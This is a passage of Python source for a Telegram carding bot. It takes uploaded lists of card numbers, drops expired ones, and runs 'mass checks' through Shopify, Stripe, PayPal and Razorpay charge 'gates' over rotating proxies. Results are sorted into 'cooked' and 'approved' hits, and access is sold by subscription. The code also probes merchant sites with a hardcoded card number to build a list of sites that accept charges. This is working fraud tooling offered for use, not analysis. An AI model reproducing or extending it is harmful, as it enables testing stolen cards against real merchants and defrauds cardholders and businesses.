                logger.error(f"RZ file upload error: {e}")
                safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
            return

        if user_sessions.get(user_id, {}).get('awaiting_rz_bulk_upload'):
            user_sessions[user_id]['awaiting_rz_bulk_upload'] = False
            try:
                file_name = message.document.file_name.lower()
                if not file_name.endswith('.txt'):
                    safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
                    return
                msg_loading = safe_send(bot.reply_to, message, "⏳ Processing Razorpay sites...", parse_mode='HTML')
                file_info = bot.get_file(message.document.file_id)
                file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
                urls = [line.strip() for line in file_content.split('\n') if line.strip() and is_valid_razorpay_url(line.strip())]
                if not urls:
                    safe_send(bot.edit_message_text, "❌ No valid Razorpay URLs found.", message.chat.id, msg_loading.message_id)
                    return

                proxies = get_active_proxies(user_id)
                test_cc = "4031630690796056|08|2029|876"
                added = 0
                skipped = 0

                sites = load_rz_sites()
                for idx, url in enumerate(urls, 1):
                    proxy = random.choice(proxies) if proxies else None
                    msg, status = check_razorpay(test_cc, proxy=proxy, site=url)

                    dead_keywords = [
                        "the server encountered an error", "international payments not supported",
                        "account number is mandatory", "temporarily blocked", "merchant account",
                        "payment not allowed", "invalid merchant", "transaction not permitted",
                        "unable to process", "merchant disabled", "account suspended",
                        "bank not supported", "payment method not allowed", "sorry, we could not process",
                        "something went wrong", "authentication failed", "unknown", "403 forbidden"
                    ]
                    if any(kw in msg.lower() for kw in dead_keywords) or status == "UNKNOWN":
                        skipped += 1
                    else:
                        if url not in sites:
                            sites.append(url)
                            added += 1

                    if idx % 5 == 0 or idx == len(urls):
                        safe_send(bot.edit_message_text,
                            f"Testing {idx}/{len(urls)} ...\n✅ Added: {added}\n⛔ Skipped: {skipped}",
                            message.chat.id, msg_loading.message_id)

                save_rz_sites(sites)
                safe_send(bot.edit_message_text,
                    f"✅ Bulk Razorpay site upload complete!\n"
                    f"Added: {added}\nSkipped (dead/invalid): {skipped}\nTotal sites: {len(sites)}",
                    message.chat.id, msg_loading.message_id, parse_mode='HTML')
            except Exception as e:
                safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
            return

        if user_sessions.get(user_id, {}).get('awaiting_proxy_file'):
            try:
                file_name = message.document.file_name.lower()
                if not file_name.endswith('.txt'):
                    safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
                    return
                msg_loading = safe_send(bot.reply_to, message, "⏳ Reading proxies...")
                file_info = bot.get_file(message.document.file_id)
                file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
                proxies = [line.strip() for line in file_content.split('\n') if line.strip() and ':' in line]
                if not proxies:
                    if msg_loading:
                        safe_send(bot.edit_message_text, "❌ No valid proxies found.", message.chat.id, msg_loading.message_id)
                    else:
                        safe_send(bot.send_message, message.chat.id, "❌ No valid proxies found.")
                    return
                current_proxies = get_user_proxies(user_id)
                new_count = 0
                for p in proxies:
                    if p not in current_proxies:
                        current_proxies.append(p)
                        new_count += 1
                save_user_proxies(user_id, current_proxies)
                result_text = f"✅ Added {new_count} new proxies.\nTotal: {len(current_proxies)}"
                if msg_loading:
                    safe_send(bot.edit_message_text, result_text, message.chat.id, msg_loading.message_id)
                else:
                    safe_send(bot.send_message, message.chat.id, result_text)
            except Exception as e:
                logger.error(f"Proxy upload error: {e}")
                safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")
            finally:
                user_sessions[user_id].pop('awaiting_proxy_file', None)
            return

        # Fallback – normal file upload (cards)
        if not is_free_group and not is_user_allowed(user_id):
            access_denied(message, "You need an active subscription to upload files.")
            return

        try:
            file_name = message.document.file_name.lower()
            if not file_name.endswith('.txt'):
                safe_send(bot.reply_to, message, "❌ Only .txt files allowed.")
                return
            msg_loading = safe_send(bot.reply_to, message, "⏳ Reading File & Removing Expired Cards...", parse_mode='HTML')
            file_info = bot.get_file(message.document.file_id)
            file_content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')

            raw_ccs = extract_cards_from_text(file_content)
            ccs = remove_expired_cards(raw_ccs)

            removed_expired = len(raw_ccs) - len(ccs)
            if removed_expired > 0:
                safe_send(bot.send_message, message.chat.id, f"🧹 Auto-removed {removed_expired} mathematically expired cards.")

            if not ccs:
                if msg_loading:
                    safe_send(bot.edit_message_text, "❌ No valid/unexpired CCs found in file.", message.chat.id, msg_loading.message_id)
                else:
                    safe_send(bot.send_message, message.chat.id, "❌ No valid/unexpired CCs found in file.")
                return

            if is_free_group:
                max_cards = 300
                if len(ccs) > max_cards:
                    ccs = ccs[:max_cards]
                    if msg_loading:
                        safe_send(bot.edit_message_text,
                            f"⚠️ Free group limit is {max_cards} cards. Only first {max_cards} will be checked.",
                            message.chat.id, msg_loading.message_id, parse_mode='HTML')
                    time.sleep(2)
            else:
                limit = get_user_upload_limit(user_id, load_json_func, users_file)
                if len(ccs) > limit and user_id not in OWNER_ID:
                    if msg_loading:
                        safe_send(bot.edit_message_text,
                            f"⚠️ Limit exceeded. Only first {limit} cards will be checked.",
                            message.chat.id, msg_loading.message_id, parse_mode='HTML')
                    ccs = ccs[:limit]
                    time.sleep(2)

            if user_id not in user_sessions:
                user_sessions[user_id] = {}
            user_sessions[user_id]['ccs'] = ccs
            user_sessions[user_id]['rz_ccs'] = ccs
            user_sessions[user_id]['send_results_to_dm'] = is_free_group

            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.add(
                types.InlineKeyboardButton("🛍️ Shopify", callback_data="run_mass_shopify"),
                types.InlineKeyboardButton("🛍️ My Sites", callback_data="run_mass_mysites")
            )
            markup.add(
                types.InlineKeyboardButton("💸 Stripe $5 Charge", callback_data="run_mass_stripe5"),
                types.InlineKeyboardButton("🔐 Stripe Auth", callback_data="run_mass_stripeauth")
            )
            markup.add(
                types.InlineKeyboardButton("💵 PayPal $1 Charge", callback_data="run_mass_paypal")
            )
            if not is_free_group:
                markup.add(types.InlineKeyboardButton("💎 Razorpay ₹1", callback_data="run_mass_razorpay"))
            markup.add(types.InlineKeyboardButton("❌ Cancel", callback_data="action_cancel"))

            menu_text = f"📂 <b>File:</b> <code>{file_name}</code>\n💳 <b>Cards to check:</b> {len(ccs)}\n<b>⚡ Select Option:</b>"
            if msg_loading:
                safe_send(bot.edit_message_text, menu_text,
                    message.chat.id, msg_loading.message_id,
                    reply_markup=markup, parse_mode='HTML')
            else:
                safe_send(bot.send_message, message.chat.id, menu_text,
                    reply_markup=markup, parse_mode='HTML')
        except Exception as e:
            logger.error(f"File upload error: {e}")
            safe_send(bot.reply_to, message, f"❌ Error: {str(e)}")

    # ============================================================================
    # CALLBACKS FOR MASS CHECKS (Shopify, Stripe, PayPal, Razorpay)
    # ============================================================================
    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_shopify")
    def callback_shopify(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            return
        try:
            safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except:
            pass
        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
            return
        ccs = user_sessions[user_id]['ccs']
        if user_id not in OWNER_ID:
            remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
            if remaining < len(ccs):
                safe_send(bot.send_message, call.message.chat.id, f"❌ Daily limit exceeded.")
                return
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔥 Cooked Only", callback_data="shopify_pref_cooked"),
            types.InlineKeyboardButton("✅ Cooked + Approved", callback_data="shopify_pref_both")
        )
        safe_send(bot.send_message, call.message.chat.id,
            "┏━━━━━━━⍟\n┃ <b>⚡ SELECT HIT PREFERENCE</b>\n┗━━━━━━━━━━━⊛\n\nChoose what results to receive:",
            parse_mode='HTML', reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("shopify_pref_"))
    def shopify_pref_callback(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        pref = call.data.replace("shopify_pref_", "")
        send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
        dm_user = user_id if send_to_dm else None

        sites = get_filtered_sites_func()
        if not sites:
            safe_send(bot.send_message, call.message.chat.id, "❌ No sites available!")
            return
        ccs = user_sessions[user_id]['ccs']
        proxies = get_active_proxies(user_id)
        if not proxies:
            safe_send(bot.send_message, call.message.chat.id, "🚫 Proxy Required!")
            return
        active_proxies = validate_proxies_strict(proxies, bot, call.message)
        if not active_proxies:
            safe_send(bot.send_message, call.message.chat.id, "❌ All proxies dead.")
            return
        if is_user_busy(user_id):
            safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy.")
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, call.message.chat.id,
            f"🔥 <b>Starting Shopify Multi‑Site...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        import threading
        def mass_thread():
            try:
                process_shopify_mass_check(
                    bot, call.message, start_msg, ccs, sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file, pref, dm_user
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_mysites")
    def callback_mysites(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            return
        user_sites = get_user_sites(user_id)
        if not user_sites:
            safe_send(bot.send_message, call.message.chat.id, "You have no personal sites. Add with /addmysite.")
            return
        if user_id not in user_sessions:
            user_sessions[user_id] = {}
        user_sessions[user_id]['personal_sites'] = user_sites
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("🔥 Cooked Only", callback_data="mysites_pref_cooked"),
            types.InlineKeyboardButton("✅ Cooked + Approved", callback_data="mysites_pref_both")
        )
        safe_send(bot.send_message, call.message.chat.id,
            "┏━━━━━━━⍟\n┃ <b>⚡ SELECT HIT PREFERENCE</b>\n┗━━━━━━━━━━━⊛\n\nUsing your personal sites.",
            parse_mode='HTML', reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("mysites_pref_"))
    def mysites_pref_callback(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        pref = call.data.replace("mysites_pref_", "")
        send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
        dm_user = user_id if send_to_dm else None

        user_sites = user_sessions.get(user_id, {}).get('personal_sites', [])
        if not user_sites:
            safe_send(bot.send_message, call.message.chat.id, "No personal sites found.")
            return
        ccs = user_sessions[user_id]['ccs']
        proxies = get_active_proxies(user_id)
        if not proxies:
            safe_send(bot.send_message, call.message.chat.id, "🚫 Proxy Required!")
            return
        active_proxies = validate_proxies_strict(proxies, bot, call.message)
        if not active_proxies:
            safe_send(bot.send_message, call.message.chat.id, "❌ All proxies dead.")
            return
        if is_user_busy(user_id):
            safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy. Cancel current check first.")
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, call.message.chat.id,
            f"🔥 <b>Starting Personal Sites Check...</b>\n💳 {len(ccs)} Cards\n🔌 {len(active_proxies)} Proxies",
            parse_mode='HTML')
        import threading
        def mass_thread():
            try:
                process_shopify_mass_check(
                    bot, call.message, start_msg, ccs, user_sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file, pref, dm_user
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    @bot.callback_query_handler(func=lambda call: call.data == "run_mass_razorpay")
    def callback_razorpay_mass(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        user_id = call.from_user.id
        if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
            return
        try:
            safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except:
            pass
        if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
            return
        ccs = user_sessions[user_id]['ccs']
        sites = load_rz_sites()
        if not sites:
            safe_send(bot.send_message, call.message.chat.id, "❌ No Razorpay sites. Use /addrz to add.", parse_mode='HTML')
            return
        proxies = get_active_proxies(user_id)
        if not proxies:
            safe_send(bot.send_message, call.message.chat.id, "🚫 Proxy Required!", parse_mode='HTML')
            return
        active_proxies = validate_proxies_strict(proxies, bot, call.message)
        if not active_proxies:
            safe_send(bot.send_message, call.message.chat.id, "❌ All proxies dead.", parse_mode='HTML')
            return
        if is_user_busy(user_id):
            safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy. Cancel current check first.", parse_mode='HTML')
            return
        if not mass_check_semaphore.acquire(blocking=False):
            safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.", parse_mode='HTML')
            return
        set_user_busy(user_id, True)
        start_msg = safe_send(bot.send_message, call.message.chat.id,
            f"💎 <b>Razorpay Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}\n🛡️ Sites: {len(sites)}",
            parse_mode='HTML')
        import threading
        def mass_thread():
            try:
                process_razorpay_mass_check(
                    bot, call.message, start_msg, ccs, sites, active_proxies,
                    user_id, load_json_func, save_json_func, users_file
                )
            finally:
                mass_check_semaphore.release()
                set_user_busy(user_id, False)
        threading.Thread(target=mass_thread).start()

    gate_map = {
        "stripe5": (check_stripe5, "Stripe $5 Charge"),
        "stripeauth": (check_stripe_auth, "Stripe Auth"),
        "paypal": (check_paypal_charge, "PayPal $1 Charge"),
    }

    for gate_key, (gate_func, gate_name) in gate_map.items():
        @bot.callback_query_handler(func=lambda call, gk=gate_key, gf=gate_func, gn=gate_name: call.data == f"run_mass_{gk}")
        def gate_callback(call, gate_key=gate_key, gate_func=gate_func, gate_name=gate_name):
            try:
                bot.answer_callback_query(call.id)
            except:
                pass
            user_id = call.from_user.id
            if call.message.chat.id != FREE_GROUP_ID and not is_user_allowed(user_id):
                return
            try:
                safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
            except:
                pass
            if user_id not in user_sessions or 'ccs' not in user_sessions[user_id]:
                safe_send(bot.send_message, call.message.chat.id, "⚠️ Upload CCs first!", parse_mode='HTML')
                return
            ccs = user_sessions[user_id]['ccs']
            if user_id not in OWNER_ID:
                remaining = get_user_daily_remaining(user_id, load_json_func, users_file)
                if remaining < len(ccs):
                    safe_send(bot.send_message, call.message.chat.id, f"❌ Daily limit exceeded.")
                    return
                fresh_users_data = load_json_func(users_file, {})
                user_info = fresh_users_data.get(str(user_id), {})
                if 'limit' in user_info and user_info['limit'] > 0:
                    user_limit = user_info['limit']
                else:
                    user_limit = gate_limits.get(gate_key, 200)
                if len(ccs) > user_limit:
                    ccs = ccs[:user_limit]
                    safe_send(bot.send_message, call.message.chat.id,
                        f"⚠️ Limit for this gate is {user_limit} cards. Truncated.", parse_mode='HTML')
            proxies = get_active_proxies(user_id)
            if not proxies:
                safe_send(bot.send_message, call.message.chat.id, "🚫 Proxy Required!")
                return
            active_proxies = validate_proxies_strict(proxies, bot, call.message)
            if not active_proxies:
                safe_send(bot.send_message, call.message.chat.id, "❌ All proxies dead.")
                return
            if is_user_busy(user_id):
                safe_send(bot.send_message, call.message.chat.id, "⏳ Already busy. Cancel current check first.")
                return
            if not mass_check_semaphore.acquire(blocking=False):
                safe_send(bot.send_message, call.message.chat.id, "⚠️ Too many mass checks globally.")
                return
            set_user_busy(user_id, True)
            send_to_dm = user_sessions.get(user_id, {}).get('send_results_to_dm', False)
            dm_user = user_id if send_to_dm else None
            start_msg = safe_send(bot.send_message, call.message.chat.id,
                f"⚡ <b>{gate_name} Mass Check Started...</b>\n💳 Cards: {len(ccs)}\n🔌 Proxies: {len(active_proxies)}",
                parse_mode='HTML')
            import threading
            def mass_thread():
                try:
                    process_gate_mass_check(
                        bot, call.message, start_msg, ccs, gate_func, gate_name,
                        active_proxies, user_id, load_json_func, save_json_func, users_file, dm_user
                    )
                finally:
                    mass_check_semaphore.release()
                    set_user_busy(user_id, False)
            threading.Thread(target=mass_thread).start()

    @bot.callback_query_handler(func=lambda call: call.data == "action_cancel")
    def callback_cancel(call):
        try:
            bot.answer_callback_query(call.id)
        except:
            pass
        try:
            safe_send(bot.delete_message, call.message.chat.id, call.message.message_id)
        except:
            pass

    # ============================================================================
    # ADDED: handle_clean_my_proxies – so it can be returned
    # ============================================================================
    @bot.message_handler(commands=['cleanmyproxies'])
    def handle_clean_my_proxies(message):
        user_id = message.from_user.id
        if not is_user_allowed(user_id) and user_id not in OWNER_ID:
            access_denied(message, "You need an active subscription to clean proxies.")
            return
        user_proxies = get_user_proxies(user_id)
        if not user_proxies:
            safe_send(bot.reply_to, message, "You have no personal proxies to clean.")
            return
        safe_send(bot.reply_to, message, f"🧹 Cleaning your {len(user_proxies)} proxies...")
        def clean_task():
            live = validate_proxies_strict(user_proxies, bot, message)
            if len(live) == len(user_proxies):
                safe_send(bot.send_message, message.chat.id, "✅ All your proxies are live!")
            else:
                removed = len(user_proxies) - len(live)
                save_user_proxies(user_id, live)
                safe_send(bot.send_message, message.chat.id, f"✅ Removed {removed} dead proxies.\nYou now have {len(live)} live proxies.")
        threading.Thread(target=clean_task).start()

    return {
        'get_user_sites': get_user_sites,
        'save_user_sites_list': save_user_sites_list,
        'set_user_busy': set_user_busy,
        'is_user_busy': is_user_busy,
        'set_stop': set_stop,
        'clear_stop': clear_stop,
        'is_stop_requested': is_stop_requested,
        'mass_check_semaphore': mass_check_semaphore,
        'handle_clean_my_proxies': handle_clean_my_proxies
    }
